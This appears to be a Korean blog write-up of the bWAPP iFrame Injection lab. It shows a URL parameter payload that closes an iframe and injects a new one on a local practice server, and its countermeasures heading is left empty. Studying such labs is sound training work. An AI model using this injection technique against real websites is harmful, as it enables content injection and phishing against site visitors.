---
title: "[bWAPP] 1. Injection - iFrame Injection"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## iFrame

inline frame으로서 해당 웹 페이지 안에 어떠한 제한 없이 또 다른 하나의 웹 페이지를 삽입 가능

![image-20220316012725890](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316012725890.png)

- URL에 변수 확인

### iframei.php

vi 편집기 통해서 확인해보면

![image-20220316012922851](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316012922851.png)

- 다음과 같이 확인 가능
- 위 변수들이 url에 PramUrl, ParaHeight, ParamWidth로 나타남

<br>

### 스크립트 삽입

![image-20220316013954537](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316013954537.png)

원래 URL

`http://172.30.1.25/bWAPP/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250`

<br>

변경 후 URL

`http://172.30.1.25/bWAPP/iframei.php?ParamUrl=robots.txt"></iframe><iframe%20src="robots.txt"%20height="250"%20width="250"></iframe><iframe ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250`

<br>

다음과 같이 iframe이 열려있는 곳에는 다시 닫아주고

`http://172.30.1.25/bWAPP/iframei.php?ParamUrl=robots.txt"></iframe>`

<br>

두번째 iframe에 삽입할 주소라던지 파일 넣어주고 다시 닫아주고

`<iframe%20src="robots.txt"%20height="250"%20width="250"></iframe>`

<br>

세번째는 그냥 깔끔하게 하기 위해 해줬다

`<iframe ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250`

<br>

<br>

## 대응방안

